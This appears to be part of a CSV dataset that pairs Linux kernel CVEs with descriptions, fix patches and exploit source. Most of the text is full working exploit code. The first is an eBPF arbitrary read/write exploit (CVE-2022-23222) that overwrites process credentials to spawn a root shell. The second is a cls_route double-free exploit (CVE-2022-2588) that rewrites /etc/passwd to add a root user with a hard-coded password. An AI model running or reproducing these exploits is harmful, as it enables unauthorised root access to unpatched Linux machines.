    ctx->qwords[0] = bpf_size == BPF_DW ? 0 : 1;
    ctx->qwords[1] = val;

    err = bpf_update_elem(ctx->comm_fd, &err, ctx->qwords, 0);
    if (err != 0) {
        WARNF(""Could not set up value on program(arbitrary_write): %d (%s)"", err, strerror(err));
        return -1;
    }

    ctx->ptrs[0] = addr;
    ctx->ptrs[1] = addr;

    err = bpf_prog_skb_run(ctx->arbitrary_write_prog, ctx->ptrs, 0x100);
    if (err != 0) {
        WARNF(""Could not run program(arbitrary_write): %d (%s)"", err, strerror(err));
        return -1;
    }

    return 0;
}

int find_cred(context_t *ctx)
{
    for (int i = 0; i < PAGE_SIZE*PAGE_SIZE ; i++)
    {
        u64 val = 0;
        kaddr_t addr = ctx->array_map + PAGE_SIZE + i*0x8;
        if (arbitrary_read(ctx, addr, &val, BPF_DW) != 0) {
            WARNF(""Could not read kernel address %p"", addr);
            return -1;
        }

        // DEBUGF(""addr %p = 0x%016x"", addr, val);

        if (memcmp(&val, __ID__, sizeof(val)) == 0) {
            kaddr_t cred_from_task = addr - 0x10;
            
            if (arbitrary_read(ctx, cred_from_task + 8, &val, BPF_DW) != 0) {
                WARNF(""Could not read kernel address %p + 8"", cred_from_task);
                return -1;
            }

            if (val == 0 && arbitrary_read(ctx, cred_from_task, &val, BPF_DW) != 0) {
                WARNF(""Could not read kernel address %p + 0"", cred_from_task);
                return -1;
            }

            if (val != 0) {
                ctx->cred = (kaddr_t)val;
                DEBUGF(""task struct ~ %p"", cred_from_task);
                DEBUGF(""cred @ %p"", ctx->cred);
                return 0;
            }
            

        }
    }
    
    return -1;
}

int overwrite_cred(context_t *ctx)
{
    if (arbitrary_write(ctx, ctx->cred + OFFSET_uid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_gid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_euid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }
    if (arbitrary_write(ctx, ctx->cred + OFFSET_egid_from_cred, 0, BPF_W) != 0) {
        return -1;
    }

    return 0;
}

int spawn_root_shell(context_t *ctx)
{
    for (int i = 0; i < PROC_NUM; i++)
    {
        kill(ctx->processes[i], SIGCONT);
    }
    while(wait(NULL) > 0);

    return 0;
}

int clean_up(context_t *ctx)
{
    close(ctx->comm_fd);
    close(ctx->arbitrary_read_prog);
    close(ctx->arbitrary_write_prog);
    kill(0, SIGCONT);
    return 0;
}

phase_t phases[] = {
    { .name = ""create bpf map(s)"", .func = create_bpf_maps },
    { .name = ""do some leak"", .func = do_leak },
    { .name = ""prepare arbitrary rw"", .func = prepare_arbitrary_rw },
    { .name = ""spawn processes"", .func = spawn_processes },
    { .name = ""find cred (slow)"", .func = find_cred },
    { .name = ""overwrite cred"", .func = overwrite_cred },
    { .name = ""spawn root shell"", .func = spawn_root_shell },
    { .name = ""clean up the mess"", .func = clean_up , .ignore_error = 1 },
};

int main(int argc, char** argv)
{
    context_t ctx = {};
    int err = 0;
    int max = sizeof(phases) / sizeof(phases[0]);
    if (getuid() == 0) {
        BADF(""You are already root, exiting..."");
        return -1;
    }
    for (int i = 1; i <= max; i++)
    {
        phase_t *phase = &phases[i-1];
        if (err != 0 && !phase->ignore_error) {
            ACTF(""phase(%d/%d) '%s' skipped"", i, max, phase->name);
            continue;
        }
        ACTF(""phase(%d/%d) '%s' running"", i, max, phase->name);
        int error = phase->func(&ctx);
        if (error != 0) {
            BADF(""phase(%d/%d) '%s' return with error %d"", i, max, phase->name, error);
            err = error;
        } else {
            OKF(""phase(%d/%d) '%s' done"", i, max, phase->name);
        }
    }
    return err;
}

",https://github.com/tr3ee/CVE-2022-23222,,,
CVE-2022-2588,https://www.opencve.io/cve/CVE-2022-2588,It was discovered that the cls_route filter implementation in the Linux kernel would not remove an old filter from the hashtable before freeing it if its handle had the value 0.,"When a route filter is replaced and the old filter has a 0 handle, the old
one won't be removed from the hashtable, while it will still be freed.

The test was there since before commit 1109c00547fc (""net: sched: RCU
cls_route""), when a new filter was not allocated when there was an old one.
The old filter was reused and the reinserting would only be necessary if an
old filter was replaced. That was still wrong for the same case where the
old handle was 0.

Remove the old filter from the list independently from its handle value.

This fixes CVE-2022-2588, also reported as ZDI-CAN-17440.

Reported-by: Zhenpeng Lin <zplin@u.northwestern.edu>
Signed-off-by: Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
Reviewed-by: Kamal Mostafa <kamal@canonical.com>
Cc: <stable@vger.kernel.org>
Cc: Jamal Hadi Salim <jhs@mojatatu.com>
---
 net/sched/cls_route.c | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/net/sched/cls_route.c b/net/sched/cls_route.c
index a35ab8c27866..3f935cbbaff6 100644
--- a/net/sched/cls_route.c
+++ b/net/sched/cls_route.c
@@ -526,7 +526,7 @@ static int route4_change(struct net *net, struct sk_buff *in_skb,
 	rcu_assign_pointer(f->next, f1);
 	rcu_assign_pointer(*fp, f);
 
-	if (fold && fold->handle && f->handle != fold->handle) {
+	if (fold) {
 		th = to_hash(fold->handle);
 		h = from_hash(fold->handle >> 16);
 		b = rtnl_dereference(head->table[th]);
-- 
2.34.1",https://lore.kernel.org/netdev/20220809170518.164662-1-cascardo@canonical.com/T/#u,"char *target = ""/etc/passwd"";
char *overwrite =
    ""user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:root:/root:/bin/bash\n"";
char *global;
char *self_path;
char *content;

#define PAGE_SIZE 0x1000
#define MAX_FILE_NUM 0x8000

int fds[MAX_FILE_NUM] = {};
int fd_2[MAX_FILE_NUM] = {};
int overlap_a = -1;
int overlap_b = -1;

int cpu_cores = 0;
int sockfd = -1;

int spray_num_1 = 2000;
int spray_num_2 = 4000;

// int spray_num_1 = 4000;
// int spray_num_2 = 5000;

int pipe_main[2];
int pipe_parent[2];
int pipe_child[2];
int pipe_defrag[2];
int pipe_file_spray[2][2];

int run_write = 0;
int run_spray = 0;
char *passwd;
bool overlapped = false;

void DumpHex(const void *data, size_t size) {
#ifdef DEBUG
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf(""%02X "", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf("" "");
      if ((i + 1) % 16 == 0) {
        printf(""|  %s \n"", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf("" "");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf(""   "");
        }
        printf(""|  %s \n"", ascii);
      }
    }
  }
#endif
}

void pin_on_cpu(int cpu) {
  cpu_set_t cpu_set;
  CPU_ZERO(&cpu_set);
  CPU_SET(cpu, &cpu_set);
  if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0) {
    perror(""sched_setaffinity()"");
    exit(EXIT_FAILURE);
  }
}

static bool write_file(const char *file, const char *what, ...) {
  char buf[1024];
  va_list args;
  va_start(args, what);
  vsnprintf(buf, sizeof(buf), what, args);
  va_end(args);
  buf[sizeof(buf) - 1] = 0;
  int len = strlen(buf);
  int fd = open(file, O_WRONLY | O_CLOEXEC);
  if (fd == -1)
    return false;
  if (write(fd, buf, len) != len) {
    int err = errno;
    close(fd);
    errno = err;
    return false;
  }
  close(fd);
  return true;
}

static void use_temporary_dir(void) {
  system(""rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data"");
  system(""touch exp_dir/data2"");
  char *tmpdir = ""exp_dir"";
  if (!tmpdir)
    exit(1);
  if (chmod(tmpdir, 0777))
    exit(1);
  if (chdir(tmpdir))
    exit(1);
  symlink(""./data"", ""./uaf"");
}

static void setup_common() {
  if (mount(0, ""/sys/fs/fuse/connections"", ""fusectl"", 0, 0)) {
  }
}

static void adjust_rlimit() {
  struct rlimit rlim;
  rlim.rlim_cur = rlim.rlim_max = (200 << 20);
  setrlimit(RLIMIT_AS, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 32 << 20;
  setrlimit(RLIMIT_MEMLOCK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 136 << 20;
  // setrlimit(RLIMIT_FSIZE, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 1 << 20;
  setrlimit(RLIMIT_STACK, &rlim);
  rlim.rlim_cur = rlim.rlim_max = 0;
  setrlimit(RLIMIT_CORE, &rlim);
  // RLIMIT_FILE
  rlim.rlim_cur = rlim.rlim_max = 14096;
  if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
    rlim.rlim_cur = rlim.rlim_max = 4096;
    spray_num_1 = 1200;
    spray_num_2 = 2800;
    if (setrlimit(RLIMIT_NOFILE, &rlim) < 0) {
      perror(""setrlimit"");
      err(1, ""setrlimit"");
    }
  }
}

void setup_namespace() {
  int real_uid = getuid();
  int real_gid = getgid();

  if (unshare(CLONE_NEWUSER) != 0) {
    perror(""[-] unshare(CLONE_NEWUSER)"");
    exit(EXIT_FAILURE);
  }

  if (unshare(CLONE_NEWNET) != 0) {
    perror(""[-] unshare(CLONE_NEWUSER)"");
    exit(EXIT_FAILURE);
  }

  if (!write_file(""/proc/self/setgroups"", ""deny"")) {
    perror(""[-] write_file(/proc/self/set_groups)"");
    exit(EXIT_FAILURE);
  }
  if (!write_file(""/proc/self/uid_map"", ""0 %d 1\n"", real_uid)) {
    perror(""[-] write_file(/proc/self/uid_map)"");
    exit(EXIT_FAILURE);
  }
  if (!write_file(""/proc/self/gid_map"", ""0 %d 1\n"", real_gid)) {
    perror(""[-] write_file(/proc/self/gid_map)"");
    exit(EXIT_FAILURE);
  }
}

#define NLMSG_TAIL(nmsg)                                                       \
  ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))

int addattr(char *attr, int type, void *data, int len) {
  struct rtattr *rta = (struct rtattr *)attr;

  rta->rta_type = type;
  rta->rta_len = RTA_LENGTH(len);
  if (len) {
    memcpy(RTA_DATA(attr), data, len);
  }

  return RTA_LENGTH(len);
}

int addattr_l(struct nlmsghdr *n, int maxlen, int type, const void *data,
              int alen) {
  int len = RTA_LENGTH(alen);
  struct rtattr *rta;

  if (NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len) > maxlen) {
    fprintf(stderr, ""addattr_l ERROR: message exceeded bound of %d\n"", maxlen);
    return -1;
  }
  rta = NLMSG_TAIL(n);
  rta->rta_type = type;
  rta->rta_len = len;
  if (alen)
    memcpy(RTA_DATA(rta), data, alen);
  n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(len);
  return 0;
}

struct rtattr *addattr_nest(struct nlmsghdr *n, int maxlen, int type) {
  struct rtattr *nest = NLMSG_TAIL(n);

  addattr_l(n, maxlen, type, NULL, 0);
  return nest;
}

int addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest) {
  nest->rta_len = (void *)NLMSG_TAIL(n) - (void *)nest;
  return n->nlmsg_len;
}

int add_qdisc(int fd) {
  char *start = malloc(0x1000);
  memset(start, 0, 0x1000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new qdisc
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
  msg->nlmsg_type = RTM_NEWQDISC;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
  // set local
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_parent = TC_H_ROOT;
  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);

  addattr_l(msg, 0x1000, TCA_KIND, ""sfq"", 4);

  // packing
#ifdef DEBUG
  DumpHex(msg, msg->nlmsg_len);
#endif

  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,
            u_int16_t flags) {
  char *start = malloc(0x2000);
  memset(start, 0, 0x2000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, ""route"", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_l(msg, 0x1000, TCA_ROUTE4_FROM, &from, 4);
  addattr_l(msg, 0x1000, TCA_ROUTE4_TO, &to, 4);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(fd, &msgh, 0);

  free(start);
  return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
  add_tc_(sockfd, 0, handle, (handle << 8) + handle, flag);
}

uint32_t calc_handle(uint32_t from, uint32_t to) {
  uint32_t handle = to;

  assert(from <= 0xff && to <= 0xff);
  handle |= from << 16;

  if (((handle & 0x7f00) | handle) != handle)
    return 0;

  if (handle == 0 || (handle & 0x8000))
    return 0;
  return handle;
}

void *delete_tc_(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;

  addattr_l(msg, 0x1000, TCA_KIND, ""route"", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf(""size of sender address is wrong\n"");
  }
  return start;
}

void delete_tc(int sockfd, uint32_t handle) {
  delete_tc_(sockfd, ((handle) << 8) + (handle));
}

// basic for spray
int add_tc_basic(int fd, uint32_t handle, void *spray_data, size_t spray_len,
                 int spray_count) {
  assert(spray_len * spray_count < 0x3000);
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; // | flags;
  msg->nlmsg_type = RTM_NEWTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x4000, TCA_KIND, ""basic"", 6);
  struct rtattr *tail = addattr_nest(msg, 0x4000, TCA_OPTIONS);
  struct rtattr *ema_tail = addattr_nest(msg, 0x4000, TCA_BASIC_EMATCHES);
  struct tcf_ematch_tree_hdr tree_hdr = {.nmatches = spray_count / 2,
                                         .progid = 0};

  addattr_l(msg, 0x4000, TCA_EMATCH_TREE_HDR, &tree_hdr, sizeof(tree_hdr));
  struct rtattr *rt_match_tail =
      addattr_nest(msg, 0x4000, TCA_EMATCH_TREE_LIST);

  char *data = malloc(0x3000);
  for (int i = 0; i < tree_hdr.nmatches; i++) {
    char *current;
    memset(data, 0, 0x3000);
    struct tcf_ematch_hdr *hdr = (struct tcf_ematch_hdr *)data;
    hdr->kind = TCF_EM_META;
    hdr->flags = TCF_EM_REL_AND;

    current = data + sizeof(*hdr);

    struct tcf_meta_hdr meta_hdr = {
        .left.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
        .right.kind = TCF_META_TYPE_VAR << 12 | TCF_META_ID_DEV,
    };

    current += addattr(current, TCA_EM_META_HDR, &meta_hdr, sizeof(hdr));
    current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);
    current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);

    addattr_l(msg, 0x4000, i + 1, data, current - data);
  }

  addattr_nest_end(msg, rt_match_tail);
  addattr_nest_end(msg, ema_tail);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };
  sendmsg(fd, &msgh, 0);
  free(data);
  free(start);
  return 1;
}

void *delete_tc_basic(int sockfd, u_int32_t handle) {
  char *start = malloc(0x4000);
  memset(start, 0, 0x4000);
  struct nlmsghdr *msg = (struct nlmsghdr *)start;

  // new filter
  msg = msg + msg->nlmsg_len;
  msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
  msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;
  msg->nlmsg_type = RTM_DELTFILTER;
  struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

  // prio, protocol
  u_int32_t prio = 1;
  u_int32_t protocol = 1;
  t->tcm_info = TC_H_MAKE(prio << 16, protocol);
  t->tcm_ifindex = 1;
  t->tcm_family = AF_UNSPEC;
  t->tcm_handle = handle;
  // t->tcm_parent = TC_H_ROOT;

  addattr_l(msg, 0x1000, TCA_KIND, ""basic"", 6);
  struct rtattr *tail = addattr_nest(msg, 0x1000, TCA_OPTIONS);
  addattr_nest_end(msg, tail);

  // packing
  struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
  struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
  struct msghdr msgh = {
      .msg_name = &nladdr,
      .msg_namelen = sizeof(nladdr),
      .msg_iov = &iov,
      .msg_iovlen = 1,
  };

  sendmsg(sockfd, &msgh, 0);
  memset(start, 0, 0x4000);
  iov.iov_len = 0x4000;
  iov.iov_base = start;
  recvmsg(sockfd, &msgh, 0);

  if (msgh.msg_namelen != sizeof(nladdr)) {
    printf(""size of sender address is wrong\n"");
  }

  return start;
}

void *slow_write() {
  printf(""start slow write\n"");
  clock_t start, end;
  int fd = open(""./uaf"", 1);

  if (fd < 0) {
    perror(""error open uaf file"");
    exit(-1);
  }

  unsigned long int addr = 0x30000000;
  int offset;
  for (offset = 0; offset < 0x80000 / 20; offset++) {
    void *r = mmap((void *)(addr + offset * 0x1000), 0x1000,
                   PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if (r < 0) {
      printf(""allocate failed at 0x%x\n"", offset);
    }
  }

  assert(offset > 0);

  void *mem = (void *)(addr);
  memcpy(mem, ""hhhhh"", 5);

  struct iovec iov[20];
  for (int i = 0; i < 20; i++) {
    iov[i].iov_base = mem;
    iov[i].iov_len = offset * 0x1000;
  }

  run_write = 1;
  start = clock();
  // 2GB max
  if (writev(fd, iov, 20) < 0) {
    perror(""slow write"");
  }
  end = clock();
  double spent = (double)(end - start) / CLOCKS_PER_SEC;
  printf(""write done, spent %f s\n"", spent);
  run_write = 0;
}

void *write_cmd() {
  // user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash
  char data[1024] =
      ""user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash"";
  // struct iovec iov = {.iov_base = data, .iov_len = strlen(data)};
  struct iovec iov = {.iov_base = content, .iov_len = strlen(content)};

  while (!run_write) {
  }
  run_spray = 1;
  if (writev(overlap_a, &iov, 1) < 0) {
    printf(""failed to write\n"");
  }
  printf(""should be after the slow write\n"");
}

void pre_exploit() {
  adjust_rlimit();
  use_temporary_dir();
  setup_namespace();
}

void exploit() {
  char buf[2 * PAGE_SIZE] = {};
  char msg[0x10] = {};
  char *spray;
  int cc;
  struct rlimit old_lim, lim, new_lim;

  // Get old limits
  if (getrlimit(RLIMIT_NOFILE, &old_lim) == 0)
    printf(""Old limits -> soft limit= %ld \t""
           "" hard limit= %ld \n"",
           old_lim.rlim_cur, old_lim.rlim_max);
  pin_on_cpu(0);
  printf(""starting exploit, num of cores: %d\n"", cpu_cores);

  sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
  assert(sockfd != -1);
  add_qdisc(sockfd);

  // wait for parent
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, ""read from parent"");
  }
  // allocate the vulnerable object
  add_tc_(sockfd, 0, 0, 0, NLM_F_EXCL | NLM_F_CREATE);

  // ask parent to keep spraying
  if (write(pipe_parent[1], ""OK"", 2) != 2) {
    err(1, ""write to child"");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, ""read from parent"");
  }

  // free the object, to free the slab
  add_tc_(sockfd, 0x11, 0x12, 0, NLM_F_CREATE);

  // wait for the vulnerable object being freed
  usleep(500 * 1000);
  printf(""freed the filter object\n"");
  // sync
  if (write(pipe_parent[1], ""OK"", 2) != 2) {
    err(1, ""write to child"");
  }
  if (read(pipe_child[0], msg, 2) != 2) {
    err(1, ""read from parent"");
  }

  usleep(1000 * 1000);

  for (int i = 0; i < spray_num_1; i++) {
    pin_on_cpu(i % cpu_cores);
    fds[i] = open(""./data2"", 1);
    assert(fds[i] > 0);
  }

  // double free route4, which will free the file
  add_tc_(sockfd, 0x11, 0x13, 0, NLM_F_CREATE);
  usleep(1000 * 100);

  // should not sleep too long, otherwise file might be claimed by others
  printf(""double free done\n"");
  printf(""spraying files\n"");

  // the following is to figure out which file is freed
  for (int i = 0; i < spray_num_2; i++) {
    pin_on_cpu(i % cpu_cores);
    fd_2[i] = open(""./uaf"", 1);
    assert(fd_2[i] > 0);
    for (int j = 0; j < spray_num_1; j++) {
      if (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) ==
          0) {
        printf(""found overlap, id : %d, %d\n"", i, j);
        overlap_a = fds[j];
        overlap_b = fd_2[i];

        pthread_t pid, pid2;
        pthread_create(&pid, NULL, slow_write, NULL);
        pthread_create(&pid2, NULL, write_cmd, NULL);

        while (!run_spray) {
        }

        close(overlap_a);
        close(overlap_b);
        printf(""closed overlap\n"");

        usleep(1000 * 100);

        int spray_num = 4096;
        write(pipe_file_spray[0][1], &spray_num, sizeof(int));
        if (read(pipe_file_spray[1][0], &msg, 2) != 2) {
          err(1, ""read from file spray"");
        }
        overlapped = true;
      }
    }
    if (overlapped)
      break;
  }

  sleep(3);
  while (run_write) {
    sleep(1);
  }

  if (!overlapped) {
    printf(""no overlap found :(...\n"");
    write(pipe_main[1], ""\xff"", 1);
  } else {
    int xx = open(target, 0);
    char buf[0x100] = {};
    // check if user in the passwd
    read(xx, buf, 0x30);
    if (!strncmp(buf, ""user"", 4)) {
      write(pipe_main[1], ""\x00"", 1);
    } else {
      printf(""not successful : %s\n"", buf);
      write(pipe_main[1], ""\xff"", 1);
    }
  }
  while (1) {
    sleep(1000);
  }
}

void post_exploit() {}

// this poc assume we have a heap address leaked
int run_exp() {
  if (pipe(pipe_parent) == -1) {
    err(1, ""fail to create pipes\n"");
  }

  if (pipe(pipe_child) == -1) {
    err(1, ""fail to create pipes\n"");
  }

  if (pipe(pipe_defrag) == -1) {
    err(1, ""fail to create pipes\n"");
  }

  if (pipe(pipe_file_spray[0]) == -1) {
    err(1, ""fail to create pipes\n"");
  }

  if (pipe(pipe_file_spray[1]) == -1) {
    err(1, ""fail to create pipes\n"");
  }

  cpu_cores = sysconf(_SC_NPROCESSORS_ONLN);

  if (fork() == 0) {
    // thread for spraying file we want to overwrite
    adjust_rlimit();
    int spray_num = 0;
    if (read(pipe_file_spray[0][0], &spray_num, sizeof(int)) < sizeof(int)) {
      err(1, ""read file spray"");
    }

    printf(""got cmd, start spraying %s\n"", target);
    spray_num = 4096;
    if (fork() == 0) {
      for (int i = 0; i < spray_num; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      while (1) {
        sleep(10000);
      }
    }

    for (int i = 0; i < spray_num; i++) {
      pin_on_cpu(i % cpu_cores);
      open(target, 0);
    }
    printf(""spray done\n"");
    write(pipe_file_spray[1][1], ""OK"", 2);
    while (1) {
      sleep(10000);
    }
    exit(0);
  }

  if (fork() == 0) {
    pin_on_cpu(0);
    pre_exploit();
    exploit();
    post_exploit();
  } else {
    sleep(2);
    if (fork() == 0) {
      // do the defragmentation to exhaust all file slabs
      // for cross cache
      adjust_rlimit();
      for (int i = 0; i < 10000; i++) {
        pin_on_cpu(i % cpu_cores);
        open(target, 0);
      }
      printf(""defrag done\n"");
      if (write(pipe_defrag[1], ""OK"", 2) != 2) {
        err(1, ""failed write defrag"");
      }
      while (1) {
        sleep(1000);
      }
    } else {
      // memory spray thread
      setup_namespace();
      pin_on_cpu(0);
      int sprayfd = socket(PF_NETLINK, SOCK_RAW, 0);
      assert(sprayfd != -1);
      add_qdisc(sprayfd);

      char msg[0x10] = {};
      char payload[256] = {};
      memset(payload + 0x10, 'A', 256 - 0x10);

      if (read(pipe_defrag[0], msg, 2) != 2) {
        err(1, ""failed read defrag"");
      }

      // if the exploit keeps failing, please tune the middle and end
      int middle = 38;
      int end = middle + 40;

      // preparing for cross cache
      for (int i = 0; i < middle; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }

      add_tc_basic(sprayfd, middle + 1, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 2, payload, 193, 32);
      add_tc_basic(sprayfd, middle + 3, payload, 193, 32);
      if (write(pipe_child[1], ""OK"", 2) != 2) {
        err(1, ""write to parent\n"");
      }
      // allocate route4
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, ""read from parent"");
      }
      // add_tc_basic(sprayfd, middle+2, payload, 129, 32);

      // prepare another part for cross cache
      for (int i = middle + 2; i < end; i++) {
        add_tc_basic(sprayfd, i + 1, payload, 193, 32);
      }
      printf(""spray 256 done\n"");

      for (int i = 1; i < end - 24; i++) {
        // prevent double free of 192
        // and being reclaimed by others
        if (i == middle || i == middle + 1)
          continue;
        delete_tc_basic(sprayfd, i + 1);
      }
      if (write(pipe_child[1], ""OK"", 2) != 2) {
        err(1, ""write to parent\n"");
      }
      // free route4 here
      if (read(pipe_parent[0], msg, 2) != 2) {
        err(1, ""read from parent"");
      }
      // if (cpu_cores == 1) sleep(1);
      delete_tc_basic(sprayfd, middle + 2);
      delete_tc_basic(sprayfd, middle + 3);
      delete_tc_basic(sprayfd, 1);
      for (int i = middle + 2; i < end; i++) {
        delete_tc_basic(sprayfd, i + 1);
      }

      printf(""256 freed done\n"");

      if (write(pipe_child[1], ""OK"", 2) != 2) {
        err(1, ""write to parent\n"");
      }
      while (1) {
        sleep(1000);
      }
    }
  }
}

int main(int argc, char **argv) {
  global = (char *)mmap(NULL, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_ANON, -1, 0);
  memset(global, 0, 0x2000);

  self_path = global;
  snprintf(self_path, 0x100, ""%s/%s"", get_current_dir_name(), argv[0]);
  printf(""self path %s\n"", self_path);

  int fd = open(target, 0);
  content = (char *)(global + 0x100);
  strcpy(content, overwrite);
  read(fd, content + strlen(overwrite), 0x1000);
  close(fd);

  assert(pipe(pipe_main) == 0);

  printf(""prepare done\n"");

  if (fork() == 0) {
    run_exp();
    while (1) {
      sleep(10000);
    }
  }

  char data;
  read(pipe_main[0], &data, 1);
  if (data == 0) {
    printf(""succeed\n"");
  } else {
    printf(""failed\n"");
  }
}",https://github.com/Markakd/CVE-2022-2588/tree/master,,,
